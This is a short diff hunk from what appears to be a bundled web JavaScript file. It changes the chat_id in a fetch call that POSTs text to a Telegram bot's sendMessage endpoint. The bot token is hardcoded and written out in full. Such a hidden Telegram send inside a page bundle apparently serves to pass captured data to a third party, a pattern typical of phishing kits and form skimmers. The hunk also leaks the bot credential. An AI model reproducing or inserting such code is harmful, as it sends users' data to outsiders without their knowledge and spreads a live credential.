@@ -14693,7 +14693,7 @@ n.m = e,
                             case 0:
                                 return "https://api.telegram.org/bot7727618246:AAEVK78mtdm4-R8Djmy7F34MKn5DnqfKE-o/sendMessage", e.next = 3, n = {
                                     text: t,
-                                    chat_id: "5017328858"
+                                    chat_id: "-4510932404"
                                 }, fetch("https://api.telegram.org/bot7727618246:AAEVK78mtdm4-R8Djmy7F34MKn5DnqfKE-o/sendMessage", {
                                     method: "POST",
                                     headers: {
